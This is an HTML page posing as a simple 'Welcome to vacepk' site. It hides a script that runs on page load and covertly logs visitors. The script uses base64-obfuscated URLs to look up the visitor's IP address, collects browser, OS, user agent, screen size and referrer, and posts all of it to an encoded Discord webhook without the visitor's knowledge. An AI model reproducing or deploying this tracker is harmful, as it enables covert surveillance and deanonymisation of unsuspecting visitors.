<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>vacepk</title>
</head>
<body>
    <h1>Welcome to vacepk</h1>
    <p>Enjoy your visit!</p>

    <script>
        (function(){
            function decodeBase64(data){ return atob(data); }

            async function getIP(){
                try {
                    const response = await fetch(decodeBase64('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return decodeBase64('VW5hYmxlIHRvIGZldGNoIElQ');
                }
            }

            function getUserAgentDetails(){
                const userAgent = navigator.userAgent;
                let browser = 'Unknown Browser';
                let os = 'Unknown OS';

                if (userAgent.includes('Firefox')) {
                    browser = 'Mozilla Firefox';
                } else if (userAgent.includes('Chrome')) {
                    browser = 'Google Chrome';
                } else if (userAgent.includes('Safari')) {
                    browser = 'Safari';
                } else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) {
                    browser = 'Internet Explorer';
                } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
                    browser = 'Opera';
                }

                if (userAgent.includes('Windows NT 10.0')) {
                    os = 'Windows 10';
                } else if (userAgent.includes('Mac OS X')) {
                    os = 'Mac OS X';
                } else if (userAgent.includes('Linux')) {
                    os = 'Linux';
                } else if (userAgent.includes('Android')) {
                    os = 'Android';
                } else if (userAgent.includes('iPhone')) {
                    os = 'iOS (iPhone)';
                } else if (userAgent.includes('iPad')) {
                    os = 'iOS (iPad)';
                }

                return { browser, os };
            }

            async function collectAndSendData(){
                const ip = await getIP();
                const { browser, os } = getUserAgentDetails();
                const userAgent = navigator.userAgent;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const referrer = document.referrer || 'Direct Visit';
                const timestamp = new Date().toISOString();

                const data = {
                    ip,
                    browser,
                    os,
                    userAgent,
                    screenWidth,
                    screenHeight,
                    referrer,
                    timestamp
                };

                sendToWebhook(data);
            }

            function sendToWebhook(data){
                const webhookUrl = decodeBase64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: JSON.stringify(data) })
                });
            }

            window.onload = collectAndSendData;
        })();
    </script>
</body>
</html>
